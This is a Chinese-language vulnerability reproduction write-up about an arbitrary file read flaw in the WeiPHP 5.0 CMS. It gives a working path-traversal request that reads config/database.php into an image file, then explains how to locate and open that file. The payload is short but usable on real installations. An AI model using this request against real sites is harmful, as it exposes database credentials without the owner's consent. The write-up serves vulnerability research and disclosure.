# WeiPHP5.0 前台任意文件读取

本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。

## 漏洞描述

`WeiPHP5.0`是在2019年停止更新的一个系统，漏洞挺多的，跟着复现分析一下，这里复现一下 `WeiPHP5.0`的前台任意文件读取漏洞

## 漏洞影响

`WeiPHP5.0`最新版

可以据此下载

https://www.weiphp.cn/doc/download_source_installation.html

## 漏洞复现

使用这个漏洞，需要先以普通用户身份登录系统，然后可以直接访问

```php
/index.php/material/Material/_download_imgage?media_id=1&picUrl=../config/database.php
```

![img](https://cdn.nlark.com/yuque/0/2022/png/22586461/1650805573704-e16bcb34-cdbc-42f9-bff4-c3437f72fd12.png)

这样会将 `../config/database.php`的内容读取出来，写入图片中，但是不会返回路径

接下来我们访问如下路径

```php
/index.php/home/file/user_pics
```

这样可以看到一些图片

![img](https://cdn.nlark.com/yuque/0/2022/png/22586461/1650805651126-489cff34-a945-4c72-b7c9-1968a09c8b4c.png)

访问该图片，是损坏的

![img](https://cdn.nlark.com/yuque/0/2022/png/22586461/1650805728192-b2b08cea-c299-4714-912f-312819526b06.png)

下载下来，记事本查看内容

![img](https://cdn.nlark.com/yuque/0/2022/png/22586461/1650805995699-87733775-ab40-432c-98f4-ebb18a464f8e.png)

## 总结

发现该文件读取漏洞本身是不难的，非常明显，难的是获取到其写入的文件名，并且能找到一个可以展示出来的页面。这虽然是一个前台漏洞，但实际上也是需要一个普通用户权限登录的，另外，通过这个洞，我还获取到了另外一个可能的漏洞，有可能可以获取到一个小 `0day`，之后再分享给大家。

## 参考链接

- https://blog.csdn.net/solitudi/article/details/11656749



`github` 链接：`https://github.com/d5shenwu/vulPOC`

